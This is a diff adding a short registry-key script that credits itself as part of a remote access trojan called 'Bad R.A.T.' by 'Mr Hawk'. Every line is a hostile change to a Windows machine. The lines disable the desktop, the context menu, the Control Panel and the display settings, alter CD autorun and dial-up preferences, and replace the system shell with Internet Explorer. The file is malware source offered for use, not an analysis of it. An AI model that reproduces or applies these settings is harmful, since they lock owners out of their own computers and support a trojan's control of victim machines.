@@ -1,0 +1,19 @@
+;Reg Keys for [Bad R.A.T.]
+;by Mr Hawk
+;www.bad-rat.de.vu
+;THX to Rafel Ivgi and The-Insider
+
+;Disable Desktop
+RegAdd HKEY_CURRENT_USER,Software\Microsoft\Windows\CurrentVersion\Policies\Explorer,NoDesktop, 1
+;Disable RightClick Menu
+RegAdd HKEY_CURRENT_USER,Software\Microsoft\Windows\CurrentVersion\Policies\Explorer, NoViewContextMenu,1
+;Disable CDAutoRun : 181=&HB5
+RegAdd HKEY_CURRENT_USER,Software\Microsoft\Windows\CurrentVersion\Policies\Explorer,NoDriveTypeAutoRun,181
+;Make I.E System Shell
+RegAdd HKEY_CURRENT_USER,Software\Microsoft\Windows\CurrentVersion\Group Policy Objects\LocalUser\Software\Microsoft\Windows\CurrentVersion\Policies\System,Shell,%systemdrive%\\program files\\internet explorer\\iExplorer.exe
+;Disable Control Panel
+RegAdd HKEY_CURRENT_USER,Software\Microsoft\Windows\CurrentVersion\Group Policy Objects\LocalUser\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer,NoControlPanel,1
+;Disable Display Panel
+RegAdd HKEY_CURRENT_USER,Software\Microsoft\Windows\CurrentVersion\Group Policy Objects\LocalUser\Software\Microsoft\Windows\CurrentVersion\Policies\System,NoDispCPL,1
+;Disable Dialup Prefs
+RegAdd HKEY_CURRENT_USER,Software\Microsoft\Windows\CurrentVersion\Group Policy Objects\LocalUser\Software\Policies\Microsoft\Windows\Network Connections,NC_DialupPrefs,0
